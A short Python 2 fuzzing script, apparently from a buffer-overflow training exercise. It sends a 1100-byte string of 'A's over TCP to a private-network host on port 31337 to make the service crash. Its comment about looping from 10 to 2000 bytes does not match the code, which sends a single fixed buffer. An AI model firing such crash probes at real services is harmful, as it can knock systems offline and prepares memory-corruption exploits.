#!/usr/bin/python
import sys,socket

# Create an array of buffers  from 10 to 2000  with increments of 20.
buffe=""
buffe+="A" * 1100
buffe+="\n"


try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.134',31337))
    print "Trying with buffer length %d" % len(buffe)
    s.send((buffe))
    s.recv(1024)
    s.close()
             
             #buffe=buffe + "A"*100


except: 
       print("Fuzzing Crashed at %s by" % str(len(buffe)))
       sys.exit()     